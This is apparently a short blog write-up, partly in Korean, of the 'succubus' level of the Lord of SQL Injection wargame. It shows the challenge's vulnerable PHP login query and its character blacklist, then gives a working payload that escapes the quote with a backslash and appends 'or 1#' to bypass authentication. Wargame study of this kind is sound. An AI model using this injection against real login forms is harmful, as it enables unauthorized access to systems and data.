---
layout: post
title:  "los prob_succubus"
date:   2019-10-22
excerpt: "Lord of Sql Injection"
tag:
- los
- sqli
- wargame
- webhacking
comments: true
---
> query : select id from prob_succubus where id='' and pw=''

~~~ php
<?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/\'/',$_GET[id])) exit("HeHe");
  if(preg_match('/\'/',$_GET[pw])) exit("HeHe");
  $query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("succubus"); 
  highlight_file(__FILE__); 
?>
~~~

# Solve
1. "\" 사용 -> '(싱글쿼터)를 문자열로 취급

### ?id=\&pw=%20or%201%23

## SUCCUBUS Clear!
